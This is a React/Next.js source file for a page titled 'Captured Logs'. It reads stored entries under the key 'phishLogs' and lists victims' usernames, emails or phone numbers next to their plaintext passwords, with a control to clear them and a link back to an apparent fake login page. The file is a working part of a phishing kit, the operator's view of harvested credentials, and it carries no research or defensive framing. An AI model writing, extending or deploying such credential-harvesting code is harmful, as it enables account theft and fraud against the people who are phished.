// app/view/page.tsx
"use client";

import { useEffect, useState } from "react";

export default function CapturedLogs() {
  const [logs, setLogs] = useState<any[]>([]);
  useEffect(() => {
    const stored = JSON.parse(localStorage.getItem("phishLogs") || "[]");
    setLogs(stored);
  }, []);

  const clearLogs = () => {
    localStorage.removeItem("phishLogs");
    setLogs([]);
  };

  return (
    <div style={{
      minHeight: "100vh",
      background: "#000",
      color: "#fff",
      padding: "40px 24px",
      fontFamily: "-apple-system, BlinkMacOSystemFont, 'Segoe UI', Roboto, sans-serif"
    }}>
      <h1 style={{ 
        color: "#fe2c55", 
        fontSize: "28px", 
        marginBottom: "32px",
        textAlign: "center"
      }}>
        Captured Logs
      </h1>

      {logs.length === 0 ? (
        <p style={{ textAlign: "center", color: "#aaa" }}>
          No captures yet.
        </p>
      ) : (
        <div style={{ overflowX: "auto" }}>
          <table style={{
            width: "100%",
            borderCollapse: "collapse",
            background: "#111",
            borderRadius: "8px",
            overflow: "hidden"
          }}>
            <thead>
              <tr style={{ background: "#222" }}>
                <th style={{ padding: "12px", borderBottom: "1px solid #333", textAlign: "left" }}>ID</th>
                <th style={{ padding: "12px", borderBottom: "1px solid #333", textAlign: "left" }}>Time</th>
                <th style={{ padding: "12px", borderBottom: "1px solid #333", textAlign: "left" }}>Username/Email/Phone</th>
                <th style={{ padding: "12px", borderBottom: "1px solid #333", textAlign: "left" }}>Password</th>
              </tr>
            </thead>
            <tbody>
              {logs.map((log) => (
                <tr key={log.id} style={{ borderBottom: "1px solid #222" }}>
                  <td style={{ padding: "12px" }}>{log.id}</td>
                  <td style={{ padding: "12px" }}>{log.timestamp}</td>
                  <td style={{ padding: "12px", fontFamily: "monospace" }}>{log.username}</td>
                  <td style={{ padding: "12px", fontFamily: "monospace" }}>{log.password}</td>
                </tr>
              ))}
            </tbody>
          </table>
        </div>
      )}

      {logs.length > 0 && (
        <button
          onClick={clearLogs}
          style={{
            marginTop: "24px",
            padding: "12px 24px",
            background: "#fe2c55",
            color: "white",
            border: "none",
            borderRadius: "6px",
            cursor: "pointer",
            fontSize: "16px",
            display: "block",
            marginLeft: "auto",
            marginRight: "auto"
          }}
        >
          Clear All Logs
        </button>
      )}

      <div style={{
        marginTop: "40px",
        textAlign: "center",
        color: "#888",
        fontSize: "14px"
      }}>
        <a href="/" style={{ color: "#fe2c55", textDecoration: "none" }}>
          ← Back to Login
        </a>
      </div>
    </div>
  );
}